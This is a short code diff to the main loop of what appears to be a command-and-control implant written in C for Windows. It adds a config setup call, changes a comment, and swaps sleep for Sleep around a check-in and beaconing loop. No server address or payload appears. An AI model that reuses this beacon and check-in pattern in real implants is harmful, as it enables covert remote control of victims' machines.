@@ -17,12 +17,13 @@ int setupAgentConfig(void){
 }
 
 int main(void){
+    setupAgentConfig();
     // TODO コールバックuuidの登録
     if(!sendCheckin(&corn_config)){
       return -1;
     }
 
-    // first sleep
+    // first sleep zzz...
     Sleep(corn_config.SleepTime);
 
 
@@ -59,7 +60,7 @@ int main(void){
         }
         freeParser(parser);
 
-        sleep(corn_config.SleepTime);
+        Sleep(corn_config.SleepTime);
     }
     return 0;
 }
